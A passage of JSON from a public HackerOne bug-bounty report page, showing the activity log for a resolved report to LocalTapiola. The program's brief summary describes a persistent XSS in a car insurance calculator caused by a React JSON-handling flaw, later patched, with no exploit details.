great!\n\nRegards,\nFrans","automated_response":false,"created_at":"2016-06-21T19:07:16.470Z","updated_at":"2016-06-21T19:07:16.470Z","actor":{"username":"fransrosen","cleared":true,"url":"/fransrosen","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/001/634/6569f1cff6ac26c01a91db469d8707228965f09f_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"localtapiola","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1041878,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Closing as resolved. Thank you for the well-written report.","automated_response":false,"created_at":"2016-06-27T22:25:41.396Z","updated_at":"2016-06-27T22:25:41.396Z","actor":{"username":"localtapiola-thomas","cleared":false,"url":"/localtapiola-thomas","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/060/017/8cccb6dc22038468aec723dab1945e7df637da6b_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"fransrosen","url":"/fransrosen"},"genius_execution_id":null,"team_handle":"localtapiola","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1041882,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"","automated_response":false,"created_at":"2016-06-27T22:26:00.863Z","updated_at":"2016-06-27T22:26:00.863Z","actor":{"url":"/localtapiola","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/008/416/b6fbd7e94497b0ffaee584d2e7096c5d5e2082e2_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"LocalTapiola"}},"bounty_amount":"300.0","bounty_currency":"usd","genius_execution_id":null,"team_handle":"localtapiola","collaborator":{"username":"fransrosen","url":"/fransrosen"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1041884,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2016-06-27T22:26:59.474Z","updated_at":"2016-06-27T22:26:59.474Z","first_to_agree":true,"actor":{"username":"localtapiola-thomas","cleared":false,"url":"/localtapiola-thomas","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/060/017/8cccb6dc22038468aec723dab1945e7df637da6b_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"localtapiola","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1041888,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2016-06-27T22:32:08.397Z","updated_at":"2016-06-27T22:32:08.397Z","actor":{"username":"fransrosen","cleared":true,"url":"/fransrosen","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/001/634/6569f1cff6ac26c01a91db469d8707228965f09f_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"localtapiola","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1041889,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","automated_response":false,"created_at":"2016-06-27T22:32:08.494Z","updated_at":"2016-06-27T22:32:08.494Z","actor":{"username":"fransrosen","cleared":true,"url":"/fransrosen","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/001/634/6569f1cff6ac26c01a91db469d8707228965f09f_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"localtapiola","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"id":2136,"category":"team","content":"##Issue\n\nThe reporter found a flaw in the way JSON data was being handled in the car insurance calculator. There was a verified bug in a 3rd party library, namely React, that was vulnerable. The reporter was able to successfully exploit the flaw and create a persistent XSS. \n\n##Fix\nThe React library was patched.\n\n##Reasoning\nThe severity of the bug was classified as medium as the risk for personal data leak was minimal to nonexistent but the result of the vulnerability was persistent. Exploiting in a real-life scenario still required some way of tricking (e.g. phishing) the user into clicking a specific link. ","can_view?":true,"can_create?":false,"attachments":[],"user":{"id":60017,"username":"localtapiola-thomas","name":"localtapiola-thomas","bio":"LocalTapiola Bug Bounty Coordinator - @tsmalmbe","cleared":false,"website":"http://www.lahitapiola.fi","location":"Espoo, Finland","created_at":"2016-03-09T13:58:17.117Z","url":"https://hackerone.com/localtapiola-thomas","anc_triager":false,"hackerone_triager":false,"hackerone_employee":false,"user_type":"legacy","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/060/017/8cccb6dc22038468aec723dab1945e7df637da6b_original.png/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/000/060/017/8cccb6dc22038468aec723dab1945e7df637da6b_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c","xtralarge":"https://hackerone.com/rails/active_storage/representations/eyJfcmFpbHMiOnsibWVzc2FnZSI6IkJBaHBBcWtrIiwiZXhwIjpudWxsLCJwdXIiOiJibG9iX2lkIn19--ef0702cef87b20f1437c9a717c8b44719b380f58/eyJfcmFpbHMiOnsibWVzc2FnZSI6IkJBaDdCam9MY21WemFYcGxTU0lOTWpZd2VESTJNRDRHT2daRlZBPT0iLCJleHAiOm51bGwsInB1ciI6InZhcmlhdGlvbiJ9fQ==--7e37b612eb3c91a96f98ad01ca9fbe53cab870dd/hackerone-userlogo.png"}}},{"category":"researcher","can_view?":true,"can_create?":false}]}